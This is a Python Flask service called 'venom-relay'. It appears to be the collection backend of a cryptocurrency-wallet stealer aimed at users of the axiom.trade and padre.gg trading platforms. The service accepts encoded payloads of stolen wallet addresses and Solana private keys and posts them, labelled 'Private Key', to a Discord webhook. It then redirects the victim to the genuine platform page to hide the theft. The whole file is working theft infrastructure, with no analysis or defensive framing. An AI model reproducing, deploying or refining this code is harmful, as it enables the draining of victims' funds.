# venom-relay — Render Web Service (Python / Flask)
# env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)

import os
import base64
import json
import time

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, Response
import requests


app = Flask(__name__)

WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
SECRET  = os.environ.get("SECRET", "")

if not WEBHOOK:
    raise SystemExit("DISCORD_WEBHOOK missing")

PLATFORM_REDIRECTS = {
    "axiom": "https://axiom.trade/",
    "padre": "https://trade.padre.gg/",
}

ALLOWED_HOSTS = ("axiom.trade", "padre.gg")

BRAND        = "Suite Logs"
SOL_COLOR    = 0x14F195
DESC_LIMIT   = 4000


def decode_b64url(s: str) -> str:
    b64 = s.replace("-", "+").replace("_", "/")
    b64 += "=" * (-len(b64) % 4)
    return base64.b64decode(b64).decode("utf-8")


def redirect_target(parsed: dict) -> str:
    host = (parsed.get("host") or "").lower()
    platform = (parsed.get("platform") or "").lower()
    for allowed in ALLOWED_HOSTS:
        if host == allowed or host.endswith("." + allowed):
            return f"https://{host}/"
    return PLATFORM_REDIRECTS.get(platform, "https://axiom.trade/")


def done_page(parsed: dict) -> str:
    target = json.dumps(redirect_target(parsed))
    return (
        "<!doctype html><meta charset=utf-8><title>ok</title>"
        "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
        "display:grid;place-items:center;height:100vh;margin:0'>done</body>"
        "<script>location.replace(" + target + ")</script>"
    )


def normalize_wallets(parsed: dict) -> list:
    platform = (parsed.get("platform") or "").lower()
    wallets = parsed.get("wallets") or []
    keys = parsed.get("keys") or []
    addresses = parsed.get("addresses") or []

    if wallets:
        return wallets

    n = max(len(keys), len(addresses))
    if n == 0:
        return []

    default_chain = "SOL" if platform == "padre" else "?"
    stubs = []
    for i in range(n):
        addr = addresses[i] if i < len(addresses) else ""
        stubs.append([addr, default_chain, "", "", "", "", ""])
    return stubs


def build_description(parsed: dict) -> tuple[str, int]:
    keys    = parsed.get("keys", []) or []
    wallets = normalize_wallets(parsed)

    blocks = []
    n = 0
    for i, w in enumerate(wallets):
        if not isinstance(w, (list, tuple)) or len(w) < 2:
            continue
        chain = (w[1] or "").upper()
        if chain != "SOL":
            continue
        addr  = w[0] or "—"
        label = (w[5] if len(w) > 5 else "") or "—"
        key   = keys[i] if i < len(keys) else "not recovered"
        n += 1
        blocks.append(
            f"**Wal {n}**  ·  Label : `{label}`\n"
            f"Adresse Solana : `{addr}`\n"
            f"Private Key : `{key}`"
        )

    if not blocks:
        return "`no SOL wallet recovered`", 0

    desc = "\n\n".join(blocks)
    if len(desc) > DESC_LIMIT:
        desc = desc[: DESC_LIMIT - 1] + "…"
    return desc, n


def build_embeds(parsed: dict) -> list:
    host = parsed.get("host", "?")
    desc, count = build_description(parsed)

    if count == 0:
        title = f"{BRAND} · {host}"
    else:
        title = f"{BRAND} · {host} · {count} SOL"

    return [{
        "title": title,
        "color": SOL_COLOR,
        "description": desc,
        "footer": {"text": BRAND},
    }]


def forward(parsed: dict, payload: str) -> Response:
    files = {
        "files[0]": (
            f"suite-logs-{int(time.time()*1000)}.json",
            payload.encode("utf-8"),
            "application/json",
        )
    }
    data = {
        "payload_json": json.dumps({
            "username": BRAND,
            "embeds": build_embeds(parsed),
            "attachments": [{"id": "0", "filename": "suite-logs.json"}],
        }),
    }

    try:
        r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
    except requests.RequestException as e:
        return Response(f"fetch failed: {e}", status=500)

    if not r.ok:
        return Response(
            f"discord {r.status_code} {r.text[:300]}",
            status=502,
            mimetype="text/plain",
        )

    return Response(done_page(parsed), mimetype="text/html")


@app.get("/")
def root():
    raw = request.args.get("data")
    if not raw:
        return Response("ok", mimetype="text/plain")

    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    try:
        payload = decode_b64url(raw)
        parsed = json.loads(payload)
    except Exception as e:
        return Response(f"bad payload: {e}", status=400, mimetype="text/plain")

    return forward(parsed, payload)


@app.post("/")
def post_root():
    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    payload = request.get_data(as_text=True) or ""
    try:
        parsed = json.loads(payload)
    except Exception:
        return Response("bad json", status=400, mimetype="text/plain")

    return forward(parsed, payload)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
